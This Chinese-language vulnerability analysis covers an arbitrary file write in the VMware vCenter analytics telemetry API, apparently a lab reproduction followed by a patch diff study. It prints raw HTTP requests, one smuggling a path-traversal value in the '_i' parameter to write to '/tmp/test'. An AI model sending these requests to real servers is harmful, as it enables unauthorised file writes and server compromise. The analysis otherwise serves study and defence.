[![](https://cdn.nlark.com/yuque/0/2021/png/8424338/1636945795762-d130c268-4544-43d5-ac16-d5fb4bfc5011.png#id=ydvyB&originHeight=802&originWidth=2946&originalType=binary&ratio=1&status=done&style=none)](https://cdn.nlark.com/yuque/0/2021/png/8424338/1636945795762-d130c268-4544-43d5-ac16-d5fb4bfc5011.png#id=ydvyB&originHeight=802&originWidth=2946&originalType=binary&ratio=1&status=done&style=none)  
[![](https://cdn.nlark.com/yuque/0/2021/png/8424338/1636945795875-07b37c6c-a60e-471e-9141-e7bf96ae2428.png#id=a2VCg&originHeight=783&originWidth=2953&originalType=binary&ratio=1&status=done&style=none)](https://cdn.nlark.com/yuque/0/2021/png/8424338/1636945795875-07b37c6c-a60e-471e-9141-e7bf96ae2428.png#id=a2VCg&originHeight=783&originWidth=2953&originalType=binary&ratio=1&status=done&style=none)  
/var/log/vmware/analytics/prod 创建 `prod`和`_cvSphere.vapi.6_7_i`  
_i 参数每次都要修改，因为文件如果被删除，就不会再次被创建了

```
POST /analytics/telemetry/ph/api/hyper/send?_c=vSphere.vapi.6_7&_i=temp HTTP/1.1
Host: 192.168.111.11
Connection: close
Accept-Encoding: gzip, deflate
Accept: */*
User-Agent: Mozilla/5.0
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Content-Type: application/json
X-Deployment-Secret: abc
Content-Length: 3
{}


```

```
POST /analytics/telemetry/ph/api/hyper/send?_c=vSphere.vapi.6_7&_i=/temp HTTP/1.1
Host: 192.168.111.11
Connection: close
Accept-Encoding: gzip, deflate
Accept: */*
User-Agent: Mozilla/5.0
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Content-Type: application/json
X-Deployment-Secret: abc
Content-Length: 3
{}


```

[![](https://cdn.nlark.com/yuque/0/2021/png/8424338/1636945795989-fbbccdeb-a89d-4969-baf5-19d1719ea74c.png#id=ZGdoo&originHeight=791&originWidth=2805&originalType=binary&ratio=1&status=done&style=none)](https://cdn.nlark.com/yuque/0/2021/png/8424338/1636945795989-fbbccdeb-a89d-4969-baf5-19d1719ea74c.png#id=ZGdoo&originHeight=791&originWidth=2805&originalType=binary&ratio=1&status=done&style=none)  
写任意路径文件

```
POST /analytics/telemetry/ph/api/hyper/send?_c=vSphere.vapi.6_7&_i=/../../../../../../tmp/test HTTP/1.1
Host: 192.168.111.11
Connection: close
Accept-Encoding: gzip, deflate
Accept: */*
User-Agent: Mozilla/5.0
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Content-Type: application/json
X-Deployment-Secret: abc
Content-Length: 4
test


```

补丁分析
----

补丁包  
VMware-analytics-6.7.0-18408195.x86_64.rpm，解压出来就是各种 jar 包和其他一些配置文件，对比 jar 包，定位到如下  
[![](https://cdn.nlark.com/yuque/0/2021/png/8424338/1636945796100-fbf1c70c-9cec-481f-9046-8eb8b4ce82c7.png#id=t8ECH&originHeight=662&originWidth=1894&originalType=binary&ratio=1&status=done&style=none)](https://cdn.nlark.com/yuque/0/2021/png/8424338/1636945796100-fbf1c70c-9cec-481f-9046-8eb8b4ce82c7.png#id=t8ECH&originHeight=662&originWidth=1894&originalType=binary&ratio=1&status=done&style=none)  
对比补丁，补丁在 AsyncTelemetryController#handleSendRequest 里新增了一个条件判断  
[![](https://cdn.nlark.com/yuque/0/2021/png/8424338/1636945796189-3aa59c25-cbbf-4743-bfcc-c71857778264.png#id=E3qHN&originHeight=718&originWidth=1901&originalType=binary&ratio=1&status=done&style=none)](https://cdn.nlark.com/yuque/0/2021/png/8424338/1636945796189-3aa59c25-cbbf-4743-bfcc-c71857778264.png#id=E3qHN&originHeight=718&originWidth=1901&originalType=binary&ratio=1&status=done&style=none)  
判断语句

```
(IdFormatUtil.isValidCollectorInstanceId(collectorInstanceId) && AsyncTelemetryController.this._collectorIdWhitelist.contains(collectorId))

```

IdFormatUtil.class 在 analytics-6.7.0.jar 里  
collectorInstanceId 正则过滤`[\\w-]{1,64}` =`[A-Za-z0-9_-]{1,64}`，如 9D36C850-1612-4EC4-B8DD-50BA239A25BB，没法使用. 和 /，所以这个绕不过了  
collectorId `[a-zA-Z][\w-\.]{1,40}[a-zA-Z0-9]`, 如 vSphere.vapi.6_7，也没法使用 /，但没调用。  
[![](https://cdn.nlark.com/yuque/0/2021/png/8424338/1636945796276-fccbb168-85eb-46d7-84bd-06713a5d7953.png#id=APZSX&originHeight=741&originWidth=1877&originalType=binary&ratio=1&status=done&style=none)](https://cdn.nlark.com/yuque/0/2021/png/8424338/1636945796276-fccbb168-85eb-46d7-84bd-06713a5d7953.png#id=APZSX&originHeight=741&originWidth=1877&originalType=binary&ratio=1&status=done&style=none)  
collectorId 是用一个白名单，需要调试才能最终确定白名单内容，但根据上面的正则也能大致猜测，这里的白名单估计和之前 ceip 遥测请求的 API 接口是一样的。  
this._collectorIdWhitelist 为在控制器初始化的传入  
[![](https://cdn.nlark.com/yuque/0/2021/png/8424338/1636945796369-31865109-8930-4e4d-b9d4-93a8ef343757.png#id=i2NVC&originHeight=1481&originWidth=3825&originalType=binary&ratio=1&status=done&style=none)](https://cdn.nlark.com/yuque/0/2021/png/8424338/1636945796369-31865109-8930-4e4d-b9d4-93a8ef343757.png#id=i2NVC&originHeight=1481&originWidth=3825&originalType=binary&ratio=1&status=done&style=none)  
另外除了公开的漏洞利用点之外，AsyncTelemetryController 还有两个私有类也有 patch，都是 Callable 的实现类（即多线程），这里会检查 collectorId  
[![](https://cdn.nlark.com/yuque/0/2021/png/8424338/1636945796574-450ed459-f8c8-463d-b585-939fe6dfee70.png#id=KA0XE&originHeight=1487&originWidth=3657&originalType=binary&ratio=1&status=done&style=none)](https://cdn.nlark.com/yuque/0/2021/png/8424338/1636945796574-450ed459-f8c8-463d-b585-939fe6dfee70.png#id=KA0XE&originHeight=1487&originWidth=3657&originalType=binary&ratio=1&status=done&style=none)  
另一个和之前漏洞点判断是一样的。  
[![](https://cdn.nlark.com/yuque/0/2021/png/8424338/1636945796758-c6718340-a491-460b-ac02-9b7ab65e3ba3.png#id=YayI5&originHeight=1495&originWidth=3795&originalType=binary&ratio=1&status=done&style=none)](https://cdn.nlark.com/yuque/0/2021/png/8424338/1636945796758-c6718340-a491-460b-ac02-9b7ab65e3ba3.png#id=YayI5&originHeight=1495&originWidth=3795&originalType=binary&ratio=1&status=done&style=none)  
那么是否可以找到其他没做过滤的 telemetryService.processTelemetry 调用点，在这之前其实还需要检查下 processTelemetry 内部是否还有 patch。  
这里调用的实现类是 TelemetryLevelBasedTelemetryServiceWrapper，另一个相关的是 LogTelemetryService  
TelemetryLevelBasedTelemetryServiceWrapper 在 analytics-6.7.0.jar 里，但对比了补丁，没发现直接的改动。  
但有其他几处 DataAppAgentId 做了相同的过滤，这就涉及到另一个漏洞点了。  
LogTelemetryService 在同个包里，也没做修改。  
[![](https://cdn.nlark.com/yuque/0/2021/png/8424338/1636945796936-43963b5c-8d46-47cb-a248-82b375be77d6.png#id=U0q0H&originHeight=1604&originWidth=3753&originalType=binary&ratio=1&status=done&style=none)](https://cdn.nlark.com/yuque/0/2021/png/8424338/1636945796936-43963b5c-8d46-47cb-a248-82b375be77d6.png#id=U0q0H&originHeight=1604&originWidth=3753&originalType=binary&ratio=1&status=done&style=none)